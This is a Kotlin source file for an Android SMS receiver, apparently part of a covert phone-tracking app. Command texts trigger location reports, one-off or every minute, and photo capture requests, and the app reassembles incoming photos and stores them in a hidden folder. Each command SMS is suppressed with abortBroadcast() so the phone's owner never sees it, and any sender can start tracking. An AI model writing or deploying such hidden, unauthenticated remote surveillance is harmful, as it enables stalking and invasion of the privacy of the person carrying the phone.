package com.safi.smstracker

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import java.io.File
import java.io.FileOutputStream

class DataSmsReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "SAFI_SMS"
        var sendingJob: Pair<String, Handler>? = null
        var sendingRunnable: Runnable? = null
        
        private val photoChunks = mutableMapOf<String, MutableList<String?>>()
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        context ?: return
        intent ?: return

        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        for (msg in messages) {
            val from = msg.originatingAddress ?: "??"
            val text = msg.messageBody ?: ""
            Log.d(TAG, "Reçu de $from: ${text.take(60)}...")

            when {
                text == Commands.REQUEST_PHOTO_FRONT -> {
                    Log.d(TAG, "📸 DEMANDE PHOTO AVANT de $from")
                    abortBroadcast()
                }

                text == Commands.REQUEST_PHOTO_BACK -> {
                    Log.d(TAG, "📸 DEMANDE PHOTO ARRIÈRE de $from")
                    abortBroadcast()
                }

                text.startsWith(Commands.RESPONSE_PHOTO) -> {
                    val data = text.removePrefix(Commands.RESPONSE_PHOTO).split("|", limit = 4)
                    if (data.size == 4) {
                        val filename = data[0]
                        val index = data[1].toIntOrNull() ?: 0
                        val total = data[2].toIntOrNull() ?: 1
                        val chunk = data[3]
                        assemblePhoto(context, filename, index, total, chunk)
                        abortBroadcast()
                    }
                }

                text == Commands.REQUEST_POS_START -> {
                    Log.d(TAG, "👉 DEMANDE SUIVI CONTINU de $from")
                    startSendingPosition(context, from)
                    abortBroadcast()
                }

                text == Commands.REQUEST_POS_STOP -> {
                    Log.d(TAG, "👉 ARRÊT SUIVI demandé par $from")
                    stopSendingPosition()
                    abortBroadcast()
                }

                text == Commands.REQUEST_POS_ONCE -> {
                    Log.d(TAG, "👉 DEMANDE POS UNE FOIS de $from")
                    MainMapActivity.instance?.sendMyPositionInResponse(from)
                    abortBroadcast()
                }

                text.startsWith(Commands.RESPONSE_POS) -> {
                    val data = text.removePrefix(Commands.RESPONSE_POS).split(",")
                    if (data.size == 2) {
                        try {
                            val lat = data[0].toDouble()
                            val lon = data[1].toDouble()
                            MainMapActivity.instance?.updateOtherPosition(lat, lon, from)
                            FloatingWindowService.instance?.updatePosition(lat, lon, from)
                            abortBroadcast()
                        } catch (e: Exception) {
                            Log.e(TAG, "Erreur parsing position", e)
                        }
                    }
                }
            }
        }
    }

    private fun assemblePhoto(context: Context, filename: String, index: Int, total: Int, chunk: String) {
        synchronized(photoChunks) {
            if (!photoChunks.containsKey(filename)) {
                photoChunks[filename] = arrayOfNulls<String>(total).toMutableList()
            }
            photoChunks[filename]?.set(index, chunk)
            
            val chunks = photoChunks[filename] ?: return
            if (chunks.all { it != null }) {
                val fullBase64 = chunks.joinToString("")
                photoChunks.remove(filename)
                
                try {
                    val bytes = android.util.Base64.decode(fullBase64, android.util.Base64.NO_WRAP)
                    val savedFile = savePhotoToGallery(context, filename, bytes)
                    Log.d(TAG, "✅ Photo complète reçue: $filename")
                    MainMapActivity.instance?.runOnUiThread {
                        MainMapActivity.instance?.onPhotoReceived(savedFile)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Erreur reconstitution photo", e)
                }
            }
        }
    }

    private fun savePhotoToGallery(context: Context, filename: String, bytes: ByteArray): File {
        val hiddenDir = File(context.filesDir, "received_photos")
        if (!hiddenDir.exists()) hiddenDir.mkdirs()
        val file = File(hiddenDir, filename)
        FileOutputStream(file).use { it.write(bytes) }
        return file
    }

    private fun startSendingPosition(context: Context, toNumber: String) {
        stopSendingPosition()
        val handler = Handler(Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                MainMapActivity.instance?.sendMyPositionInResponse(toNumber)
                handler.postDelayed(this, 60000)
            }
        }
        sendingJob = Pair(toNumber, handler)
        sendingRunnable = runnable
        handler.post(runnable)
    }

    private fun stopSendingPosition() {
        sendingRunnable?.let { sendingJob?.second?.removeCallbacks(it) }
        sendingJob = null
        sendingRunnable = null
    }
}
